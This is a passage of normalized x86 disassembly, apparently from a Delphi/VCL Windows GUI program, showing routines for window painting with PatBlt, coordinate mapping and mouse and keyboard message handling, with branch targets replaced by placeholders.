mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45662a
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_45665c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403378
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_455590
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40339c
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_4033e8
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_4033e8
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_4033e8
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_4033e8
jmp r-xdata
sub_45674c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_417744
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_456c34
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_4559dc
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_4559f0
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_417794
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_45692c
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_455564
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_4033e8
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_45c380
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_453160
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_456917
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_45c380
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_45c380
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4553ec
test esi esi
je r-xdata
sub_45692c
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_4033e8
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_4577b0
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_4033e8
mov eax esi
call sub_455494
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_455450
mov ecx eax
xor edx edx
xor eax eax
call sub_41776c
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_4033e8
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_4569d0
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_456a00
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_456a6c
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_456b2c
sub_456a9c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_456acc
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_455590
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_456af8
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_456b2c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_456c00
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_456c34
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_456ccc
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_46cc58
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_46cc58
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_4555ec
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_476404
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_4033e8
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_46cb9c
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_4033e8
jmp r-xdata
sub_456e60
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408bb4
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408be0
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_4555ec
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_4089f8
call sub_408968
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408968
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_456f08
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_456f38
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_456efc
push ebp
call sub_456f08
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_456f88
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_457014
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_45704c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_456acc
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_46cb0c
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_4033e8
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_46cb0c
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_4033e8
sub_4570d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4555bc
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_455c84
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_45704c
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_45711c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4555bc
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_457138
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4555bc
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_455c84
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_45704c
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_4033e8
sub_457190
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_456a6c
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_456a00
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_456a6c
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_45722c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_45704c
pop esi
pop ebx
retn
sub_457251
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_45704c
pop esi
pop ebx
retn
sub_457277
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_45704c
pop esi
pop ebx
retn
sub_4572a1
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_45704c
pop esi
pop ebx
retn
sub_4572cc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_4572fc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_456acc
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_46cb0c
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_4033e8
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_46cb0c
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_4033e8
sub_457374
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_4573ac
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_46cb0c
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_4033e8
sub_4573e4
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_455c84
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4573ac
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406c9c
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4033e8
sub_45745c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4573ac
pop esi
pop ebx
retn
sub_45747c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4573ac
pop esi
pop ebx
retn
sub_45749c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_46cb0c
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_4033e8
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_460cf8
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4574f4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_455c74
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_455c84
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_456c00
pop esi
retn
sub_457534
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
